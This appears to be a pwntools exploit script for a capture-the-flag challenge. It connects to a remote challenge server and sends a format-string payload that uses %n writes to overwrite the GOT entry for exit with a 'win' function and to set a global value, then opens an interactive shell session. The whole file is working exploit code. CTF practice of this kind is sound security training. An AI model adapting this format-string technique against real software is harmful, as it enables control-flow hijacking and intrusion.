from pwn import *
context(arch="amd64", os="linux")
elf = ELF("./challenge")
context.terminal = ["tmux", "splitw", "-h"]

# gdbscript = '''
# break *0x{elf.symbols.main:x}+222
# continue
# '''.format(**locals())

# p = gdb.debug([elf.path] , gdbscript=gdbscript)

# p = elf.process()
p = remote("45.76.177.238", 9335)

p.recvuntil(b"> ")
got = 0x4010b0
exit = 0x4010e0
win = 0x401328
payload = b"%64X%10$n"+ b"%1273X%11$n" + b"%3567X%12$hn" + p64(elf.got["exit"]+2) + p64(0x404070) + p64(elf.got["exit"])
# payload = fmtstr_payload(6,{elf.got["exit"] : p64(elf.symbols["win"]), 0x404070: p64(1337) })
print(len(payload))
p.sendline(payload)
p.interactive()